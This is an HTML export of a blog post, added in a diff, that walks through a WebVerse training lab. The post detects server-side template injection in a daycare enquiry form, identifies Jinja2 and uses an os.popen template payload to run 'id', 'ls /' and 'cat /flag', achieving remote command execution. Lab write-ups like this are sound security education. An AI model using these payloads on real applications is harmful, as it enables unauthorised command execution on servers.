@@ -1,0 +1,72 @@
+<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>Sunnyside Daycare (SSTI) WebVerse</title><style>
+      * {
+        font-family: Georgia, Cambria, "Times New Roman", Times, serif;
+      }
+      html, body {
+        margin: 0;
+        padding: 0;
+      }
+      h1 {
+        font-size: 50px;
+        margin-bottom: 17px;
+        color: #333;
+      }
+      h2 {
+        font-size: 24px;
+        line-height: 1.6;
+        margin: 30px 0 0 0;
+        margin-bottom: 18px;
+        margin-top: 33px;
+        color: #333;
+      }
+      h3 {
+        font-size: 30px;
+        margin: 10px 0 20px 0;
+        color: #333;
+      }
+      header {
+        width: 640px;
+        margin: auto;
+      }
+      section {
+        width: 640px;
+        margin: auto;
+      }
+      section p {
+        margin-bottom: 27px;
+        font-size: 20px;
+        line-height: 1.6;
+        color: #333;
+      }
+      section img {
+        max-width: 640px;
+      }
+      footer {
+        padding: 0 20px;
+        margin: 50px 0;
+        text-align: center;
+        font-size: 12px;
+      }
+      .aspectRatioPlaceholder {
+        max-width: auto !important;
+        max-height: auto !important;
+      }
+      .aspectRatioPlaceholder-fill {
+        padding-bottom: 0 !important;
+      }
+      header,
+      section[data-field=subtitle],
+      section[data-field=description] {
+        display: none;
+      }
+      </style></head><body><article class="h-entry">
+<header>
+<h1 class="p-name">Sunnyside Daycare (SSTI) WebVerse</h1>
+</header>
+<section data-field="subtitle" class="p-summary">
+Lab can be found at: https://webverselabs-pro.com/
+</section>
+<section data-field="body" class="e-content">
+<section name="e57b" class="section section--body section--first section--last"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h3 name="53dd" id="53dd" class="graf graf--h3 graf--leading graf--title">Sunnyside Daycare (SSTI) WebVerse</h3><p name="ad06" id="ad06" class="graf graf--p graf-after--h3">Lab can be found at: <a href="https://webverselabs-pro.com/" data-href="https://webverselabs-pro.com/" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">https://webverselabs-pro.com/</a></p><figure name="e3e5" id="e3e5" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*D6xyqy4-7K_7F1YB3U01ug.png" data-width="502" data-height="502" src="https://cdn-images-1.medium.com/max/800/1*D6xyqy4-7K_7F1YB3U01ug.png"></figure><p name="a263" id="a263" class="graf graf--p graf-after--figure">We land upon a page which allows us to make an enquiry for a daycare spot. Seems like a good place to test.</p><figure name="7027" id="7027" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*JRsXe9PLedGxRa6Psgrbgw.png" data-width="2244" data-height="1306" src="https://cdn-images-1.medium.com/max/800/1*JRsXe9PLedGxRa6Psgrbgw.png"></figure><p name="5608" id="5608" class="graf graf--p graf-after--figure">Using the payload below gives us a good indication of what’s happening here. Server-side template injection:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="typescript" name="8d8d" id="8d8d" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content">{{<span class="hljs-number">7</span>*<span class="hljs-number">7</span>}}</span></pre><figure name="af8b" id="af8b" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="1*2EokSBKvqXqEiEMa02OjDA.png" data-width="1634" data-height="1344" src="https://cdn-images-1.medium.com/max/800/1*2EokSBKvqXqEiEMa02OjDA.png"></figure><p name="5e1d" id="5e1d" class="graf graf--p graf-after--figure">We see 49 is rendered on the page, so this does prove our payload is working.</p><figure name="7d97" id="7d97" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*1mtEpdDlrjQZUN2H3LPE4A.png" data-width="1588" data-height="904" src="https://cdn-images-1.medium.com/max/800/1*1mtEpdDlrjQZUN2H3LPE4A.png"></figure><p name="83da" id="83da" class="graf graf--p graf-after--figure">Next, I try to print 7 “7&#39;s” with the next payload:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="bash" name="f735" id="f735" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content">{{7*<span class="hljs-string">&#x27;7&#x27;</span>}}</span></pre><figure name="2ead" id="2ead" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="1*4nN88JT85XZH_CzxLiyVjg.png" data-width="1586" data-height="1080" src="https://cdn-images-1.medium.com/max/800/1*4nN88JT85XZH_CzxLiyVjg.png"></figure><p name="f2c3" id="f2c3" class="graf graf--p graf-after--figure">It renders. This proves that we are likely dealing with Jinja2. This <a href="https://medium.com/@nnanna.adaobi.e/understanding-server-side-template-injection-ssti-in-flask-jinja2-a-beginner-friendly-e85270f214f0" data-href="https://medium.com/@nnanna.adaobi.e/understanding-server-side-template-injection-ssti-in-flask-jinja2-a-beginner-friendly-e85270f214f0" class="markup--anchor markup--p-anchor" target="_blank">article</a> says that Jinja runs inside python. So now, I began looking for an appropriate payload.</p><figure name="7978" id="7978" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*gxE9X63QSJ7gFpmIQAZJIA.png" data-width="1550" data-height="1128" src="https://cdn-images-1.medium.com/max/800/1*gxE9X63QSJ7gFpmIQAZJIA.png"></figure><p name="fa39" id="fa39" class="graf graf--p graf-after--figure">Just out of curiosity, I wanted to see if I could force an error. I used {{ as my payload. This caused an internal error (500) but debugging was off, so I did not get anything verbose:</p><figure name="d0ef" id="d0ef" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*-DiJhM4FwMruMdVqad7Ugw.png" data-width="2308" data-height="722" src="https://cdn-images-1.medium.com/max/800/1*-DiJhM4FwMruMdVqad7Ugw.png"></figure><p name="3ee5" id="3ee5" class="graf graf--p graf-after--figure">Next, I found an article that used a python payload to exploit this kind of SSTI and ran it in the name field:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="lua" name="3440" id="3440" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content">{{request.application.__globals__.__builtins__.__import__(<span class="hljs-string">&#x27;os&#x27;</span>).<span class="hljs-built_in">popen</span>(<span class="hljs-string">&#x27;id&#x27;</span>).<span class="hljs-built_in">read</span>()}}</span></pre><figure name="40f5" id="40f5" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="1*tS1nRWUZPWHxP4AMunN1yw.png" data-width="1490" data-height="1148" src="https://cdn-images-1.medium.com/max/800/1*tS1nRWUZPWHxP4AMunN1yw.png"></figure><p name="fd09" id="fd09" class="graf graf--p graf-after--figure">Of course, now we could essentially get RCE:</p><figure name="13cf" id="13cf" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*zWbJ3V7wfeAh6LoP-TGM9A.png" data-width="2080" data-height="1224" src="https://cdn-images-1.medium.com/max/800/1*zWbJ3V7wfeAh6LoP-TGM9A.png"></figure><p name="a445" id="a445" class="graf graf--p graf-after--figure">Next I ran an ls command which showed that the flag.txt file was on the root directory:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="lua" name="7341" id="7341" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content">{{request.application.__globals__.__builtins__.__import__(<span class="hljs-string">&#x27;os&#x27;</span>).<span class="hljs-built_in">popen</span>(<span class="hljs-string">&#x27;ls /&#x27;</span>).<span class="hljs-built_in">read</span>()}}</span></pre><figure name="04a5" id="04a5" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="1*Qwiye_ldVHED5Jy4L8a07Q.png" data-width="1522" data-height="1178" src="https://cdn-images-1.medium.com/max/800/1*Qwiye_ldVHED5Jy4L8a07Q.png"></figure><p name="0c73" id="0c73" class="graf graf--p graf-after--figure">So now, I could simply cat the flag.txt file:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="lua" name="cb3d" id="cb3d" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content">{{request.application.__globals__.__builtins__.__import__(<span class="hljs-string">&#x27;os&#x27;</span>).<span class="hljs-built_in">popen</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>).<span class="hljs-built_in">read</span>()}}</span></pre><figure name="4769" id="4769" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="1*q0sNd5FNN0buuIEnvLr0Aw.png" data-width="2020" data-height="940" src="https://cdn-images-1.medium.com/max/800/1*q0sNd5FNN0buuIEnvLr0Aw.png"></figure><p name="e99d" id="e99d" class="graf graf--p graf-after--figure">Thanks for following along!</p><p name="86d7" id="86d7" class="graf graf--p graf-after--p graf--trailing">🍺 Quick message to readers: if my writeups help you, please consider a small donation to my buymeacoffee link <a href="http://buymeacoffee.com/7s26simon" data-href="http://buymeacoffee.com/7s26simon" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">here</a>. This is not required but is very much appreciated! 🍺</p></div></div></section>
+</section>
+<footer><p>By <a href="https://medium.com/@7s26simon" class="p-author h-card">7s26Simon</a> on <a href="https://medium.com/p/75da6fd4c48c"><time class="dt-published" datetime="2026-05-09T07:01:01.004Z">May 9, 2026</time></a>.</p><p><a href="https://medium.com/@7s26simon/sunnyside-daycare-ssti-webverse-75da6fd4c48c" class="p-canonical">Canonical link</a></p><p>Exported from <a href="https://medium.com">Medium</a> on June 13, 2026.</p></footer></article></body></html>
